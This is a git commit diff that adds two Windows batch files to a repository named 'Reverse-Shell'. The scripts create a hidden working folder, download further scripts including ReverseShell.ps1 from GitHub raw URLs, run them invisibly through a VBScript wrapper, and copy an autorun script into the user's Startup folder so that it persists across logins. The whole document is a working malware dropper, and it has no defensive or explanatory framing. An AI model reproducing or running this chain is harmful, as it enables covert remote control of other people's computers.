c77ce52e6b330feebe942af40d8ce9c6f580d91e
OscarZoomer <OscarZoomer@users.noreply.github.com>
2021-04-05 20:05:35 +0200

    add run2

---
+++ run.bat
@@ -0,0 +1,8 @@
+@echo off
+c:
+cd C:\
+mkdir kaas
+cd kaas
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/invisible.vbs -Outfile invisible.vbs"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/run2.bat -Outfile run2.bat"
+wscript.exe invisible.vbs run2.bat
---
+++ run2.bat
@@ -0,0 +1,18 @@
+@echo off
+c:
+cd C:\
+cd kaas
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/launch.bat -Outfile launch.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/ReverseShell.ps1 -Outfile ReverseShell.ps1"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/autorun.bat -Outfile autorun.bat"
+cd %appdata%
+cd Microsoft
+cd Windows
+cd "Start Menu"
+cd Programs
+cd Startup
+xcopy /s/y c:\kaas\autorun.bat
+cd C:\
+cd kaas
+launch.bat
